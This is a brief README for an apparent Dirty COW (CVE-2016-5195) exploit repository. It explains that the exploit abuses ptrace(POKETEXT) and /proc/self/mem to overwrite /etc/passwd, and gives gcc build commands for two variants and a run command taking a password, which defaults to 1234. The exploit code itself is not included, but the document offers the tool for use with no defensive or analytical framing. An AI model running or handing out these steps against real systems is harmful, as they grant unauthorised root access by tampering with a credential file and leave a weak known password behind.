# cve-2016-5195-DirtyCOW
* This exploit using **ptrace(POKETEXT)** & **/proc/self/mem** and change /etc/passwd

# Compile 
* exploit:
```
gcc exploit.c -o exploit -lpthread -lcrypt
```
* exploit_proc:
```
gcc exploit_proc.c -o exploit_proc -lpthread -lcrypt
```

# Use
```
./exploit [password] or ./exploit_proc [password]
```
* if you empty password field it used default password : 1234
